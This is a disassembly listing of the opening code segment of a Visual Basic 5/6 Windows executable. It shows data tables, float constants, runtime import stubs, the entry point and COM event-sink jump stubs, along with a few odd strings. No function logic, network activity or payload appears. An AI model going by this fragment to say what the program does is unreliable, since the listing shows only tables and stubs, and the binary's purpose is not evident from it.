.text:00401118 ; ===========================================================================
.text:00401118
.text:00401118 ; Segment type: Pure code
.text:00401118 ; Segment permissions: Read/Execute
.text:00401118 _text           segment para public 'CODE' use32
.text:00401118                 assume cs:_text
.text:00401118                 ;org 401118h
.text:00401118                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
.text:00401118 dword_401118    dd 80001h, 407741h      ; DATA XREF: .text:004076AB↓o
.text:00401120 dword_401120    dd 80001h, 40781Dh      ; DATA XREF: .text:00407787↓o
.text:00401128 dword_401128    dd 80001h, 4078F6h      ; DATA XREF: .text:00407863↓o
.text:00401130 dword_401130    dd 80001h, 4079D2h      ; DATA XREF: .text:0040793C↓o
.text:00401138 dword_401138    dd 80007h, 407CF0h, 407D14h, 407CF8h, 80005h, 407F07h
.text:00401138                                         ; DATA XREF: .text:00407A18↓o
.text:00401150                 dd 0
.text:00401154                 dd offset loc_407F0E
.text:00401158 dword_401158    dd 8000Fh, 4080E4h, 408107h, 4080ECh
.text:00401158                                         ; DATA XREF: .text:00407F63↓o
.text:00401168 dword_401168    dd 8000Dh, 4081FCh, 0   ; DATA XREF: .text:00408199↓o
.text:00401174                 dd offset loc_408203
.text:00401178 dword_401178    dd 80005h, 4083F4h, 0   ; DATA XREF: .text:00408272↓o
.text:00401184                 dd offset loc_4083FB
.text:00401188 dword_401188    dd 40006h, 0            ; DATA XREF: .text:00408459↓o
.text:00401190                 dd offset loc_408519
.text:00401194                 dd offset loc_408507
.text:00401198 dword_401198    dd 80007h, 4087E1h, 40880Ch, 4087E8h
.text:00401198                                         ; DATA XREF: .text:0040855C↓o
.text:004011A8 flt_4011A8      dd 72.0                 ; DATA XREF: .text:00409B6A↓r
.text:004011AC flt_4011AC      dd 37.0                 ; DATA XREF: .text:00409A62↓r
.text:004011B0 flt_4011B0      dd 81.0                 ; DATA XREF: .text:0040995A↓r
.text:004011B4 flt_4011B4      dd 11.0                 ; DATA XREF: .text:004098D6↓r
.text:004011B8 flt_4011B8      dd 51.0                 ; DATA XREF: .text:004096C6↓r
.text:004011B8                                         ; sub_40B485+5F↓r
.text:004011BC flt_4011BC      dd 28.0                 ; DATA XREF: .text:00409642↓r
.text:004011C0 flt_4011C0      dd 56.0                 ; DATA XREF: .text:004095BE↓r
.text:004011C0                                         ; .text:00409852↓r
.text:004011C4 flt_4011C4      dd 98.0                 ; DATA XREF: .text:0040953A↓r
.text:004011C4                                         ; sub_40B485+4FD↓r
.text:004011C8 flt_4011C8      dd 91.0                 ; DATA XREF: .text:004094B6↓r
.text:004011C8                                         ; sub_40A806+227↓r
.text:004011CC flt_4011CC      dd 73.0                 ; DATA XREF: .text:00409432↓r
.text:004011D0 flt_4011D0      dd 86.0                 ; DATA XREF: .text:0040932A↓r
.text:004011D0                                         ; sub_40A806+BF3↓r
.text:004011D4 flt_4011D4      dd 85.0                 ; DATA XREF: .text:004092A6↓r
.text:004011D4                                         ; sub_40B485+20F↓r
.text:004011D8 flt_4011D8      dd 89.0                 ; DATA XREF: .text:0040919E↓r
.text:004011D8                                         ; .text:0040974A↓r
.text:004011DC flt_4011DC      dd 95.0                 ; DATA XREF: .text:0040911A↓r
.text:004011DC                                         ; sub_40BAAD+ED↓r ...
.text:004011E0 flt_4011E0      dd 25.0                 ; DATA XREF: .text:00409096↓r
.text:004011E0                                         ; .text:00409222↓r ...
.text:004011E4 flt_4011E4      dd 70.0                 ; DATA XREF: .text:00409012↓r
.text:004011E8 flt_4011E8      dd 3.0                  ; DATA XREF: .text:00408F2B↓r
.text:004011E8                                         ; sub_40A806+6FB↓r
.text:004011EC flt_4011EC      dd 65.0                 ; DATA XREF: .text:00408EAD↓r
.text:004011F0 flt_4011F0      dd 42.0                 ; DATA XREF: .text:00408E2F↓r
.text:004011F4 flt_4011F4      dd 69.0                 ; DATA XREF: .text:00408DB1↓r
.text:004011F8 flt_4011F8      dd 12.0                 ; DATA XREF: .text:00408D33↓r
.text:004011F8                                         ; sub_40A806+EF↓r
.text:004011FC flt_4011FC      dd 79.0                 ; DATA XREF: .text:00408CD6↓r
.text:004011FC                                         ; .text:004097CE↓r ...
.text:00401200 flt_401200      dd 60.0                 ; DATA XREF: .text:00408C79↓r
.text:00401204 flt_401204      dd 20.0                 ; DATA XREF: .text:00408BF4↓r
.text:00401204                                         ; sub_40A806+8D8↓r
.text:00401208 flt_401208      dd 94.0                 ; DATA XREF: .text:00408B6F↓r
.text:00401208                                         ; sub_40A806+977↓r
.text:0040120C flt_40120C      dd 92.0                 ; DATA XREF: .text:00408AEA↓r
.text:0040120C                                         ; .text:00408F8E↓r
.text:00401210 flt_401210      dd 32.0                 ; DATA XREF: .text:00408A65↓r
.text:00401210                                         ; .text:004093AE↓r
.text:00401214 flt_401214      dd 97.0                 ; DATA XREF: .text:004089DF↓r
.text:00401214                                         ; .text:00409AE6↓r
.text:00401218 flt_401218      dd 2.0                  ; DATA XREF: .text:00408982↓r
.text:00401218                                         ; .text:004099DE↓r
.text:0040121C flt_40121C      dd 33.0                 ; DATA XREF: .text:00408904↓r
.text:0040121C                                         ; sub_40A806+839↓r ...
.text:00401220 flt_401220      dd 77.0                 ; DATA XREF: .text:004088A7↓r
.text:00401220                                         ; sub_40B485+45E↓r
.text:00401224                 align 8
.text:00401228 dword_401228    dd 80005h, 409C72h, 0   ; DATA XREF: .text:0040888E↓o
.text:00401234                 dd offset loc_409C7A
.text:00401238 dword_401238    dd 80003h, 409D9Bh, 409DA0h, 0
.text:00401238                                         ; DATA XREF: .text:00409CD4↓o
.text:00401248 dword_401248    dd 8000Dh, 409E44h, 0   ; DATA XREF: .text:00409DFC↓o
.text:00401254                 dd offset loc_409E4B
.text:00401258 dword_401258    dd 80007h, 409F62h, 409F73h, 409F69h
.text:00401258                                         ; DATA XREF: .text:00409EB5↓o
.text:00401268 dword_401268    dd 40006h, 0            ; DATA XREF: sub_409F9B+28↓o
.text:00401270                 dd offset loc_40A44A
.text:00401274                 dd offset loc_40A440
.text:00401278 dword_401278    dd 40002h, 0            ; DATA XREF: sub_40A4A1+26↓o
.text:00401280                 dd offset loc_40A4E0
.text:00401284                 align 8
.text:00401288 dword_401288    dd 40006h, 0            ; DATA XREF: sub_40A502+28↓o
.text:00401290                 dd offset loc_40A632
.text:00401294                 dd offset loc_40A60F
.text:00401298 flt_401298      dd 88.0                 ; DATA XREF: sub_40A806+AB5↓r
.text:0040129C flt_40129C      dd 47.0                 ; DATA XREF: sub_40A806+A16↓r
.text:0040129C                                         ; sub_40B485+17F↓r
.text:004012A0 flt_4012A0      dd 24.0                 ; DATA XREF: sub_40A806+79A↓r
.text:004012A0                                         ; sub_40B485+EF↓r
.text:004012A4 flt_4012A4      dd 64.0                 ; DATA XREF: sub_40A806+5DD↓r
.text:004012A8 flt_4012A8      dd 49.0                 ; DATA XREF: sub_40A806+53E↓r
.text:004012AC flt_4012AC      dd 17.0                 ; DATA XREF: sub_40A806+49F↓r
.text:004012B0 flt_4012B0      dd 31.0                 ; DATA XREF: sub_40A806+400↓r
.text:004012B4 flt_4012B4      dd 18.0                 ; DATA XREF: sub_40A806+2C6↓r
.text:004012B8 flt_4012B8      dd 10.0                 ; DATA XREF: sub_40A806+188↓r
.text:004012BC flt_4012BC      dd 61.0                 ; DATA XREF: sub_40A806+5F↓r
.text:004012C0 dword_4012C0    dd 40004h, 2 dup(0)     ; DATA XREF: sub_40A806+28↓o
.text:004012CC                 dd offset loc_40B46C
.text:004012D0 flt_4012D0      dd 6.0                  ; DATA XREF: sub_40B485+59C↓r
.text:004012D4 flt_4012D4      dd 78.0                 ; DATA XREF: sub_40B485+32F↓r
.text:004012D8 flt_4012D8      dd 74.0                 ; DATA XREF: sub_40B485+29F↓r
.text:004012DC                 align 10h
.text:004012E0 dword_4012E0    dd 40004h, 2 dup(0)     ; DATA XREF: sub_40B485+28↓o
.text:004012EC                 dd offset loc_40BA94
.text:004012F0 flt_4012F0      dd 27.0                 ; DATA XREF: sub_40BAAD+224↓r
.text:004012F4 flt_4012F4      dd 93.0                 ; DATA XREF: sub_40BAAD+5D↓r
.text:004012F8 dword_4012F8    dd 40004h, 2 dup(0)     ; DATA XREF: sub_40BAAD+26↓o
.text:00401304                 dd offset loc_40BD49
.text:00401308 dword_401308    dd 8000Eh, 0            ; DATA XREF: sub_40BD75+27↓o
.text:00401310                 dd offset loc_40BF3F
.text:00401314                 dd offset loc_40BF1B
.text:00401318 dword_401318    dd 40002h, 0            ; DATA XREF: sub_40C2A0+26↓o
.text:00401320                 dd offset loc_40C372
.text:00401324                 align 8
.text:00401328 dbl_401328      dq 12.5                 ; DATA XREF: sub_40C38F+86E↓r
.text:00401328                                         ; sub_40C38F+ADC↓r
.text:00401330 dword_401330    dd 40006h, 0            ; DATA XREF: sub_40C38F+28↓o
.text:00401338                 dd offset loc_40D091
.text:0040133C                 dd offset loc_40D07E
.text:00401340 dword_401340    dd 40002h, 0            ; DATA XREF: sub_40D0DD+26↓o
.text:00401348                 dd offset loc_40D11C
.text:0040134C                 align 10h
.text:00401350 dword_401350    dd 40002h, 0            ; DATA XREF: sub_40D139+26↓o
.text:00401358                 dd offset loc_40D183
.text:0040135C                 align 10h
.text:00401360 dword_401360    dd 40002h, 0            ; DATA XREF: sub_40D1A8+26↓o
.text:00401368                 dd offset loc_40D1E7
.text:0040136C                 align 10h
.text:00401370 dword_401370    dd 4000Ah, 0            ; DATA XREF: sub_40D204+26↓o
.text:00401378                 dd offset loc_40D24E
.text:0040137C                 dd offset loc_40D245
.text:00401380 dword_401380    dd 40002h, 0            ; DATA XREF: sub_40D26B+26↓o
.text:00401388                 dd offset loc_40D2AA
.text:0040138C                 align 10h
.text:00401390 dbl_401390      dq 16.0                 ; DATA XREF: sub_40D2C7+3A↓r
.text:00401398 dword_401398    dd 40006h, 0            ; DATA XREF: sub_40D2C7+26↓o
.text:004013A0                 dd offset loc_40D3C6
.text:004013A4                 dd offset loc_40D3AF
.text:004013A8 dword_4013A8    dd 40004h, 2 dup(0)     ; DATA XREF: sub_40D3DE+26↓o
.text:004013B4                 dd offset loc_40D581
.text:004013B8                 align 10h
.text:004013C0 ; [00000006 BYTES: COLLAPSED FUNCTION __vbaChkstk]
.text:004013C6 ; [00000006 BYTES: COLLAPSED FUNCTION __vbaExceptHandler]
.text:004013CC ; [00000006 BYTES: COLLAPSED FUNCTION __vbaFPException]
.text:004013D2 ; [00000006 BYTES: COLLAPSED FUNCTION _adj_fdiv_m16i]
.text:004013D8 ; [00000006 BYTES: COLLAPSED FUNCTION _adj_fdiv_m32]
.text:004013DE ; [00000006 BYTES: COLLAPSED FUNCTION _adj_fdiv_m32i]
.text:004013E4 ; [00000006 BYTES: COLLAPSED FUNCTION _adj_fdiv_m64]
.text:004013EA ; [00000006 BYTES: COLLAPSED FUNCTION _adj_fdiv_r]
.text:004013F0 ; [00000006 BYTES: COLLAPSED FUNCTION _adj_fdivr_m16i]
.text:004013F6 ; [00000006 BYTES: COLLAPSED FUNCTION _adj_fdivr_m32]
.text:004013FC ; [00000006 BYTES: COLLAPSED FUNCTION _adj_fdivr_m32i]
.text:00401402 ; [00000006 BYTES: COLLAPSED FUNCTION _adj_fdivr_m64]
.text:00401408 ; [00000006 BYTES: COLLAPSED FUNCTION _adj_fpatan]
.text:0040140E ; [00000006 BYTES: COLLAPSED FUNCTION _adj_fprem]
.text:00401414 ; [00000006 BYTES: COLLAPSED FUNCTION _adj_fprem1]
.text:0040141A ; [00000006 BYTES: COLLAPSED FUNCTION _adj_fptan]
.text:00401420 ; [00000006 BYTES: COLLAPSED FUNCTION _CIatan]
.text:00401426 ; [00000006 BYTES: COLLAPSED FUNCTION _CIcos]
.text:0040142C ; [00000006 BYTES: COLLAPSED FUNCTION _CIexp]
.text:00401432 ; [00000006 BYTES: COLLAPSED FUNCTION _CIlog]
.text:00401438 ; [00000006 BYTES: COLLAPSED FUNCTION _CIsin]
.text:0040143E ; [00000006 BYTES: COLLAPSED FUNCTION _CIsqrt]
.text:00401444 ; [00000006 BYTES: COLLAPSED FUNCTION _CItan]
.text:0040144A ; [00000006 BYTES: COLLAPSED FUNCTION _allmul]
.text:00401450 ; [00000006 BYTES: COLLAPSED FUNCTION __vbaHresultCheckObj]
.text:00401456 ; [00000006 BYTES: COLLAPSED FUNCTION __vbaNew2]
.text:0040145C ; [00000006 BYTES: COLLAPSED FUNCTION DllFunctionCall]
.text:00401462 ; [00000006 BYTES: COLLAPSED FUNCTION __vbaStrCopy]
.text:00401468 ; [00000006 BYTES: COLLAPSED FUNCTION __vbaRedim]
.text:0040146E ; [00000006 BYTES: COLLAPSED FUNCTION __vbaI2I4]
.text:00401474 ; [00000006 BYTES: COLLAPSED FUNCTION __vbaStrMove]
.text:0040147A ; [00000006 BYTES: COLLAPSED FUNCTION __vbaR8Str]
.text:00401480 ; [00000006 BYTES: COLLAPSED FUNCTION __vbaFpUI1]
.text:00401486 ; [00000006 BYTES: COLLAPSED FUNCTION __vbaStrCat]
.text:0040148C ; [00000006 BYTES: COLLAPSED FUNCTION __vbaFreeStrList]
.text:00401492 ; [00000006 BYTES: COLLAPSED FUNCTION __vbaAryLock]
.text:00401498 ; [00000006 BYTES: COLLAPSED FUNCTION __vbaSetSystemError]
.text:0040149E ; [00000006 BYTES: COLLAPSED FUNCTION __vbaAryUnlock]
.text:004014A4 ; [00000006 BYTES: COLLAPSED FUNCTION __vbaFreeStr]
.text:004014AA ; [00000006 BYTES: COLLAPSED FUNCTION __vbaErrorOverflow]
.text:004014B0 ; [00000006 BYTES: COLLAPSED FUNCTION __vbaStrToAnsi]
.text:004014B6 ; [00000006 BYTES: COLLAPSED FUNCTION __vbaStrToUnicode]
.text:004014BC ; [00000006 BYTES: COLLAPSED FUNCTION __vbaCyMul]
.text:004014C2 ; [00000006 BYTES: COLLAPSED FUNCTION __vbaCyI4]
.text:004014C8 ; [00000006 BYTES: COLLAPSED FUNCTION __vbaCyAdd]
.text:004014CE ; [00000006 BYTES: COLLAPSED FUNCTION __vbaStrCmp]
.text:004014D4 ; [00000006 BYTES: COLLAPSED FUNCTION rtcMidBstr]
.text:004014DA ; [00000006 BYTES: COLLAPSED FUNCTION __vbaFreeVar]
.text:004014E0 ; [00000006 BYTES: COLLAPSED FUNCTION __vbaAryDestruct]
.text:004014E6 ; [00000006 BYTES: COLLAPSED FUNCTION __vbaFpI2]
.text:004014EC ; [00000006 BYTES: COLLAPSED FUNCTION __vbaFpI4]
.text:004014F2 ; [00000006 BYTES: COLLAPSED FUNCTION __vbaVarDup]
.text:004014F8 ; [00000006 BYTES: COLLAPSED FUNCTION rtcVarBstrFromAnsi]
.text:004014FE ; [00000006 BYTES: COLLAPSED FUNCTION __vbaStrVarMove]
.text:00401504 ; [00000006 BYTES: COLLAPSED FUNCTION rtcDateDiff]
.text:0040150A ; [00000006 BYTES: COLLAPSED FUNCTION __vbaVarTstGt]
.text:00401510 ; [00000006 BYTES: COLLAPSED FUNCTION rtcGetPresentDate]
.text:00401516 ; [00000006 BYTES: COLLAPSED FUNCTION rtcDateAdd]
.text:0040151C ; [00000006 BYTES: COLLAPSED FUNCTION __vbaRedimPreserve]
.text:00401522 ; [00000006 BYTES: COLLAPSED FUNCTION __vbaFreeVarList]
.text:00401528 ; [00000006 BYTES: COLLAPSED FUNCTION __vbaFreeObj]
.text:0040152E ; [00000006 BYTES: COLLAPSED FUNCTION rtcErrObj]
.text:00401534 ; [00000006 BYTES: COLLAPSED FUNCTION __vbaObjSet]
.text:0040153A ; [00000006 BYTES: COLLAPSED FUNCTION __vbaUI1I2]
.text:00401540 ; [00000006 BYTES: COLLAPSED FUNCTION __vbaVarMove]
.text:00401546 ; [00000006 BYTES: COLLAPSED FUNCTION EVENT_SINK_QueryInterface]
.text:0040154C ; [00000006 BYTES: COLLAPSED FUNCTION EVENT_SINK_AddRef]
.text:00401552 ; [00000006 BYTES: COLLAPSED FUNCTION EVENT_SINK_Release]
.text:00401558 ; [00000006 BYTES: COLLAPSED FUNCTION ThunRTMain]
.text:0040155E                 align 10h
.text:00401560
.text:00401560                 public start
.text:00401560 start:
.text:00401560                 push    offset aVb56    ; "VB5!6&*"
.text:00401565                 call    ThunRTMain
.text:00401565 ; ---------------------------------------------------------------------------
.text:0040156A                 dw 0
.text:0040156C                 align 10h
.text:00401570                 dd 30h, 40h, 0
.text:0040157C                 dd 5528A0FDh, 44092E72h, 6008E289h, 4B3D739Eh, 0
.text:00401590                 dd 10000h, 6C610000h, 34332873h, 74656361h, 73656E6Fh
.text:004015A4                 dd 65736100h, 6C617578h, 0
.text:004015B0 dword_4015B0    dd 7, 402A98h, 7, 402A54h, 7, 4029E0h, 7, 402980h, 7, 402940h
.text:004015B0                                         ; DATA XREF: .text:00402288↓o
.text:004015D8                 dd 50001h, 402290h, 0
.text:004015E4                 dd 2 dup(0FFFFFFFFh), 0
.text:004015F0                 dd offset off_4023D4
.text:004015F4                 dd offset unk_40E06C
.text:004015F8                 dd 5, 401610h, 3 dup(0)
.text:0040160C                 dd offset dword_401610
.text:00401610 dword_401610    dd 40h, 4, 2 dup(0)     ; DATA XREF: .text:0040160C↑o
.text:00401620                 dd 1
.text:00401624 aVb56           db 'VB5!6&*',0          ; DATA XREF: .text:start↑o
.text:0040162C                 dd 3 dup(0)
.text:00401638                 dd 7Eh, 2 dup(0)
.text:00401644                 dd 0A0000h, 409h, 0
.text:00401650                 dd offset sub_40BF67
.text:00401654                 dd offset dword_402054
.text:00401658                 dd 70F210h, 0FFFFFF00h, 8, 1, 4, 0E9h, 4016D0h, 4015B0h
.text:00401678                 dd 40156Ch, 78h, 8Ah, 9Fh, 0A0h, 4 dup(0)
.text:0040169C                 db  64h ; d
.text:0040169D                 db 0E9h, 67h, 6Fh
.text:004016A0                 db 0FBh
.text:004016A1                 db 74h, 61h, 6Eh
.text:004016A4                 db  20h
.text:004016A5                 db 63h, 6Fh, 6Eh
.text:004016A8                 db  63h ; c
.text:004016A9                 db 65h, 72h, 74h
.text:004016AC                 db 0E9h
.text:004016AD                 align 2
.text:004016AE aAlteRerontEtan db 'alte',27h,'reront etanc/on',0
.text:004016C3                 align 4
.text:004016C4 aAcetones       db 'acetones',0
.text:004016CD                 align 10h
.text:004016D0 aP              db 'P',0
.text:004016D2                 align 4
.text:004016D4                 dd 0A761599Ah, 4783D144h, 0A9AD708Eh, 0DF113761h, 5 dup(0)
.text:004016F8                 dd 80h, 5 dup(0)
.text:00401710                 dd 0B9h, 0
.text:00401718                 dd offset dword_406DEC
.text:0040171C                 dd 4Ch, 50h, 0A6F639D6h, 45527AD8h, 9C3E0CA4h, 69469B5Eh
.text:00401734                 dd 4 dup(0)
.text:00401744                 dd 1, 80h, 5 dup(0)
.text:00401760                 dd 0B7h, 0
.text:00401768                 dd offset dword_406D34
.text:0040176C                 dd 9Ch, 50h, 2417BDA3h, 4CB48A80h, 9704CA8Ah, 234378D0h
.text:00401784                 dd 4 dup(0)
.text:00401794                 dd 2, 80h, 5 dup(0)
.text:004017B0                 dd 0CDh, 0
.text:004017B8                 dd offset dword_406F68
.text:004017BC                 dd 0ECh, 50h, 3FDD2C81h, 43A65483h, 417CFF8Bh, 0C5C839F6h
.text:004017D4                 dd 4 dup(0)
.text:004017E4                 dd 3, 80h, 5 dup(0)
.text:00401800                 dd 0BFh, 0
.text:00401808                 dd offset dword_406EA8
.text:0040180C                 dd 13Ch
.text:00401810 dword_401810    dd 1, 402290h, 0        ; DATA XREF: .text:004018C4↓o
.text:00401810                                         ; .text:off_4022E4↓o ...
.text:0040181C                 dd offset dword_407448
.text:00401820                 dd 0FFFFFFFFh, 0
.text:00401828                 dd offset off_4022E4
.text:0040182C                 dd offset unk_40E008
.text:00401830                 dd 0
.text:00401834                 dd 788810h, 3 dup(0)
.text:00401844                 dd offset off_401888
.text:00401848                 dd 1, 402498h, 0
.text:00401854                 dd offset off_401888
.text:00401858                 dd 1, 401890h, 0
.text:00401864                 dd offset off_40188C
.text:00401868                 dd 1, 401890h, 1B70001h, 6C0068h, 4018B8h, 40FB24h, 0
.text:00401884                 dd 7A9EC4h
.text:00401888 off_401888      dd offset dword_4024A8  ; DATA XREF: .text:00401844↑o
.text:00401888                                         ; .text:00401854↑o
.text:0040188C off_40188C      dd offset dword_4024B8  ; DATA XREF: .text:00401864↑o
.text:00401890 dword_401890    dd 1F0040h, 34h, 4024C8h, 0FFFFFFFFh, 2 dup(0)
.text:00401890                                         ; DATA XREF: .text:004018C0↓o
.text:004018A8                 dd offset dword_4018BC
.text:004018AC                 dd 7AA288h, 4024D8h, 0FFFFFFFFh, 401958h
.text:004018BC dword_4018BC    dd 0                    ; DATA XREF: .text:004018A8↑o
.text:004018C0                 dd offset dword_401890
.text:004018C4                 dd offset dword_401810
.text:004018C8                 dd offset EVENT_SINK_QueryInterface
.text:004018CC                 dd offset EVENT_SINK_AddRef
.text:004018D0                 dd offset EVENT_SINK_Release
.text:004018D4                 dd 6 dup(0)
.text:004018EC                 dd offset loc_401950
.text:004018F0                 dd 18h dup(0)
.text:00401950 ; ---------------------------------------------------------------------------
.text:00401950
.text:00401950 loc_401950:                             ; DATA XREF: .text:004018EC↑o
.text:00401950                 sub     dword ptr [esp+4], 33h ; '3'
.text:00401958                 jmp     loc_407684
.text:00401958 ; ---------------------------------------------------------------------------
.text:0040195D                 align 10h
.text:00401960 dword_401960    dd 40001h, 402290h, 0   ; DATA XREF: .text:00401A40↓o
.text:00401960                                         ; .text:off_4023A4↓o ...
.text:0040196C                 dd offset dword_407348
.text:00401970                 dd 0FFFFFFFFh, 0
.text:00401978                 dd offset off_4023A4
.text:0040197C                 dd offset unk_40E058
.text:00401980                 dd 0
.text:00401984                 dd 7A8980h, 3 dup(0)
.text:00401994                 dd offset off_4019D8
.text:00401998                 dd 1, 4027ACh, 0
.text:004019A4                 dd offset off_4019D8
.text:004019A8                 dd 1, 4019E0h, 0
.text:004019B4                 dd offset off_4019DC
.text:004019B8                 dd 1, 4019E0h, 0Ch, 10000Ch, 401A08h, 41022Ch, 0
.text:004019D4                 dd 7AC9FCh
.text:004019D8 off_4019D8      dd offset dword_4027BC  ; DATA XREF: .text:00401994↑o
.text:004019D8                                         ; .text:004019A4↑o
.text:004019DC off_4019DC      dd offset dword_4027CC  ; DATA XREF: .text:004019B4↑o
.text:004019E0 dword_4019E0    dd 20040h, 90h, 4027DCh, 0FFFFFFFFh, 2 dup(0)
.text:004019E0                                         ; DATA XREF: .text:00401A3C↓o
.text:004019F8                 dd offset dword_401A38
.text:004019FC                 dd 7AA2B8h, 4027ECh, 0FFFFFFFFh, 401A60h, 401A6Dh, 401A7Ah
.text:00401A14                 dd 401A94h, 401AA1h, 401ABBh, 401AC8h, 401AD5h, 401AE2h
.text:00401A2C                 dd 401AEFh, 401A87h, 401AAEh
.text:00401A38 dword_401A38    dd 0                    ; DATA XREF: .text:004019F8↑o
.text:00401A3C                 dd offset dword_4019E0
.text:00401A40                 dd offset dword_401960
.text:00401A44                 dd offset EVENT_SINK_QueryInterface
.text:00401A48                 dd offset EVENT_SINK_AddRef
.text:00401A4C                 dd offset EVENT_SINK_Release
.text:00401A50                 dd 2 dup(0)
.text:00401A58 ; ---------------------------------------------------------------------------
.text:00401A58                 sub     dword ptr [esp+4], 0FFFFh
.text:00401A60                 jmp     loc_4079F1
.text:00401A65 ; ---------------------------------------------------------------------------
.text:00401A65                 sub     dword ptr [esp+4], 0FFFFh
.text:00401A6D                 jmp     loc_407D49
.text:00401A72 ; ---------------------------------------------------------------------------
.text:00401A72                 sub     dword ptr [esp+4], 0FFFFh
.text:00401A7A                 jmp     loc_407F3C
.text:00401A7F ; ---------------------------------------------------------------------------
.text:00401A7F                 sub     dword ptr [esp+4], 0FFFFh
.text:00401A87                 jmp     loc_40814C
.text:00401A8C ; ---------------------------------------------------------------------------
.text:00401A8C                 sub     dword ptr [esp+4], 0FFFFh
.text:00401A94                 jmp     loc_408172
.text:00401A99 ; ---------------------------------------------------------------------------
.text:00401A99                 sub     dword ptr [esp+4], 0FFFFh
.text:00401AA1                 jmp     loc_40824B
.text:00401AA6 ; ---------------------------------------------------------------------------
.text:00401AA6                 sub     dword ptr [esp+4], 0FFFFh
.text:00401AAE                 jmp     loc_408433
.text:00401AB3 ; ---------------------------------------------------------------------------
.text:00401AB3                 sub     dword ptr [esp+4], 0FFFFh
.text:00401ABB                 jmp     loc_408535
.text:00401AC0 ; ---------------------------------------------------------------------------
.text:00401AC0                 sub     dword ptr [esp+4], 0FFFFh
.text:00401AC8                 jmp     loc_408865
.text:00401ACD ; ---------------------------------------------------------------------------
.text:00401ACD                 sub     dword ptr [esp+4], 0FFFFh
.text:00401AD5                 jmp     loc_409CAD
.text:00401ADA ; ---------------------------------------------------------------------------
.text:00401ADA                 sub     dword ptr [esp+4], 0FFFFh
.text:00401AE2                 jmp     loc_409DD5
.text:00401AE7 ; ---------------------------------------------------------------------------
.text:00401AE7                 sub     dword ptr [esp+4], 0FFFFh
.text:00401AEF                 jmp     loc_409E8E
.text:00401AEF ; ---------------------------------------------------------------------------
.text:00401AF4 dword_401AF4    dd 10001h, 402290h, 0   ; DATA XREF: .text:00401BD0↓o
.text:00401AF4                                         ; .text:00401C10↓o ...
.text:00401B00                 dd offset dword_407408
.text:00401B04                 dd 0FFFFFFFFh, 0
.text:00401B0C                 dd offset off_402314
.text:00401B10                 dd offset unk_40E01C
.text:00401B14                 dd 0
.text:00401B18                 dd 788600h, 3 dup(0)
.text:00401B28                 dd offset off_401B6C
.text:00401B2C                 dd 1, 40262Ch, 0
.text:00401B38                 dd offset off_401B6C
.text:00401B3C                 dd 1, 401B74h, 0
.text:00401B48                 dd offset off_401B70
.text:00401B4C                 dd 2, 401B74h, 1B70001h, 6C0068h, 401BC4h, 40F41Ch, 0
.text:00401B68                 dd 7ABD40h
.text:00401B6C off_401B6C      dd offset dword_40263C  ; DATA XREF: .text:00401B28↑o
.text:00401B6C                                         ; .text:00401B38↑o
.text:00401B70 off_401B70      dd offset dword_40264C  ; DATA XREF: .text:00401B48↑o
.text:00401B74 a4:                                     ; DATA XREF: .text:00401BCC↓o
.text:00401B74                 text "UTF-16LE", '@',0Ah
.text:00401B78                 text "UTF-16LE", '4',0
.text:00401B7C                 dd offset dword_40265C
.text:00401B80                 dd 30001h, 2 dup(0)
.text:00401B8C                 dd offset dword_401BC8
.text:00401B90 dword_401B90    dd 7AA298h, 40266Ch, 30001h, 1F0040h, 38h, 4024C8h, 0FFFFFFFFh
.text:00401B90                                         ; DATA XREF: .text:00401C0C↓o
.text:00401BAC                 dd 2 dup(0)
.text:00401BB4                 dd offset dword_401C08
.text:00401BB8                 dd 7AA288h, 4024D8h, 0FFFFFFFFh, 401CA4h
.text:00401BC8 dword_401BC8    dd 0                    ; DATA XREF: .text:00401B8C↑o
.text:00401BCC                 dd offset a4            ; "@\n4"
.text:00401BD0                 dd offset dword_401AF4
.text:00401BD4                 dd offset EVENT_SINK_QueryInterface
.text:00401BD8                 dd offset EVENT_SINK_AddRef
.text:00401BDC                 dd offset EVENT_SINK_Release
.text:00401BE0                 dd 0Ah dup(0)
.text:00401C08 dword_401C08    dd 0                    ; DATA XREF: .text:00401BB4↑o
.text:00401C0C                 dd offset dword_401B90+0Ch
.text:00401C10                 dd offset dword_401AF4
.text:00401C14                 dd offset EVENT_SINK_QueryInterface
.text:00401C18                 dd offset EVENT_SINK_AddRef
.text:00401C1C                 dd offset EVENT_SINK_Release
.text:00401C20                 dd 6 dup(0)
.text:00401C38                 dd offset loc_401C9C
.text:00401C3C                 dd 18h dup(0)
.text:00401C9C ; ---------------------------------------------------------------------------
.text:00401C9C
.text:00401C9C loc_401C9C:                             ; DATA XREF: .text:00401C38↑o
.text:00401C9C                 sub     dword ptr [esp+4], 37h ; '7'
.text:00401CA4                 jmp     loc_407760
.text:00401CA4 ; ---------------------------------------------------------------------------
.text:00401CA9                 align 4
.text:00401CAC dword_401CAC    dd 20001h, 402290h, 0   ; DATA XREF: .text:00401D88↓o
.text:00401CAC                                         ; .text:00401DE4↓o ...
.text:00401CB8                 dd offset dword_4073C8
.text:00401CBC                 dd 0FFFFFFFFh, 0
.text:00401CC4                 dd offset off_402344
.text:00401CC8                 dd offset unk_40E030
.text:00401CCC                 align 10h
.text:00401CD0                 dd 7AE628h, 3 dup(0)
.text:00401CE0                 dd offset off_401D24
.text:00401CE4                 dd 1, 4026D0h, 0
.text:00401CF0                 dd offset off_401D24
.text:00401CF4                 dd 1, 401D2Ch, 0
.text:00401D00                 dd offset off_401D28
.text:00401D04                 dd 2, 401D2Ch, 1B70001h, 6C0068h, 401D7Ch, 40ED14h, 0
.text:00401D20                 dd 7ABE04h
.text:00401D24 off_401D24      dd offset dword_402574  ; DATA XREF: .text:00401CE0↑o
.text:00401D24                                         ; .text:00401CF0↑o
.text:00401D28 off_401D28      dd offset dword_402584  ; DATA XREF: .text:00401D00↑o
.text:00401D2C dword_401D2C    dd 110040h, 34h, 4026ECh, 30001h, 2 dup(0)
.text:00401D2C                                         ; DATA XREF: .text:00401D84↓o
.text:00401D44                 dd offset dword_401D80
.text:00401D48 dword_401D48    dd 7AA2A8h, 4026FCh, 30001h, 1F0040h, 38h, 4024C8h, 0FFFFFFFFh
.text:00401D48                                         ; DATA XREF: .text:00401DE0↓o
.text:00401D64                 dd 2 dup(0)
.text:00401D6C                 dd offset dword_401DDC
.text:00401D70                 dd 7AA288h, 4024D8h, 0FFFFFFFFh, 401E78h
.text:00401D80 dword_401D80    dd 0                    ; DATA XREF: .text:00401D44↑o
.text:00401D84                 dd offset dword_401D2C
.text:00401D88                 dd offset dword_401CAC
.text:00401D8C                 dd offset EVENT_SINK_QueryInterface
